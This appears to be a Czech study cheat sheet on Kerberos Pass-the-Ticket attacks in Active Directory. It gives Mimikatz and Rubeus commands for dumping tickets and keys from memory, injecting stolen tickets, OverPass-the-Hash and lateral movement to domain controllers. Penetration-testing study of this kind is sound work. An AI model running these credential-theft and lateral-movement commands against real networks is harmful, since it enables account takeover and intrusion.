# 🎟️ Pass the Ticket (PtT) Windows

---

# 1. Kerberos základ

Kerberos je autentizační protokol používaný hlavně v Active Directory.

Místo opakovaného posílání hesla používá:

```text
Tickets
```

---

## Typy Kerberos ticketů

|Ticket|Popis|
|---|---|
|TGT (Ticket Granting Ticket)|Hlavní identifikační ticket uživatele|
|TGS (Ticket Granting Service)|Ticket pro konkrétní službu|
|KDC (Key Distribution Center)|Služba na Domain Controlleru vydávající tickety|

---

## TGT

TGT funguje jako:

```text
Vstupenka do celého Kerberos prostředí
```

Používá se pro žádost o další tickety.

Příklad:

```text
User
 |
 ▼
KDC
 |
 ▼
TGT
 |
 ▼
TGS pro služby
```

---

## TGS

TGS je určený pro konkrétní službu:

Příklady:

```text
CIFS  → SMB sdílení
HTTP  → Web služby
MSSQL → SQL Server
HOST  → Remote služby
```

---

# 2. Harvesting Kerberos ticketů

Pokud mám administrátorská práva, můžu získat tickety uživatelů přihlášených na systému.

---

# A) Mimikatz

Export ticketů:

```cmd
mimikatz.exe
```

```text
privilege::debug
```

```text
sekurlsa::tickets /export
```

---

Výstup:

```text
.kirbi soubory
```

---

## Identifikace ticketů

|Název|Význam|
|---|---|
|krbtgt|TGT ticket|
|$ na konci názvu|Computer účet|
|běžný uživatel|Uživatelský ticket|

---

# B) Rubeus

Modernější nástroj pro práci s Kerberos.

Dump ticketů:

```cmd
Rubeus.exe dump /nowrap
```

---

Výstup:

```text
Base64 Kerberos ticket
```

Výhody:

- fileless práce
    
- jednoduchý přenos
    
- integrace s dalšími útoky
    

---

# 3. Pass the Ticket útok

Pass the Ticket znamená:

```text
Vložení cizího Kerberos ticketu do vlastní session
```

Výsledkem je:

```text
Přístup jako vlastník ticketu
```

---

# A) Rubeus PtT

Import ticketu:

```cmd
Rubeus.exe ptt /ticket:<ticket>
```

Ticket může být:

- Base64
    
- .kirbi soubor
    

---

Po úspěchu:

```text
Aktuální session používá importovaný ticket
```

---

Příklad použití:

```cmd
dir \\DC01\c$
```

---

# B) Mimikatz PtT

Import `.kirbi` ticketu:

```cmd
mimikatz.exe
```

```text
kerberos::ptt C:\path\ticket.kirbi
```

---

Kontrola ticketů:

```cmd
klist
```

---

# 4. OverPass the Hash (Pass the Key)

OverPass the Hash spojuje:

```text
Pass the Hash
+
Kerberos
```

Cíl:

```text
NTLM hash / Kerberos key
        |
        ▼
 vytvoření TGT ticketu
```

---

## Získání Kerberos klíčů

Mimikatz:

```text
sekurlsa::ekeys
```

---

## Vytvoření TGT pomocí Rubeus

```cmd
Rubeus.exe asktgt ^
/user:<USER> ^
/domain:<DOMAIN> ^
/aes256:<KEY> ^
/ptt
```

---

Výsledek:

```text
Platný Kerberos TGT v aktuální session
```

---

# 5. Laterální pohyb pomocí ticketů

Pokud účet má oprávnění:

- Remote Management Users
    
- Administrators
    
- SMB access
    

můžeš použít ticket pro vzdálený přístup.

---

# PowerShell Remoting

Po importu ticketu:

```powershell
Enter-PSSession -ComputerName <TARGET>
```

---

Workflow:

```text
Získání ticketu
        |
        ▼
Pass the Ticket
        |
        ▼
Kerberos autentizace
        |
        ▼
Remote Access
```

---

# 6. Rubeus Sacrificial Process

Rubeus může vytvořit oddělený proces, kde budou použity jiné tickety.

---

## Vytvoření procesu

```cmd
Rubeus.exe createnetonly /program:cmd.exe
```

---

Nové CMD:

```text
Oddělená Kerberos session
```

---

Import ticketu:

```cmd
Rubeus.exe asktgt ^
/user:<USER> ^
/domain:<DOMAIN> ^
/aes256:<KEY> ^
/ptt
```

---

Výsledek:

```text
Tento proces funguje jako daný uživatel v síti
```

---

# 7. Nejčastější workflow

```text
Credential Dumping
        |
        ▼
LSASS / Tickets
        |
        ▼
.kirbi nebo Base64 ticket
        |
        ▼
Pass the Ticket
        |
        ▼
Kerberos Access
        |
        ▼
Lateral Movement
```

---

# 8. Nástroje

|Nástroj|Použití|
|---|---|
|Mimikatz|Dump a import ticketů|
|Rubeus|Moderní Kerberos útoky|
|klist|Kontrola ticketů|
|Impacket|Kerberos autentizace z Linuxu|
|NetExec|Síťová enumerace|
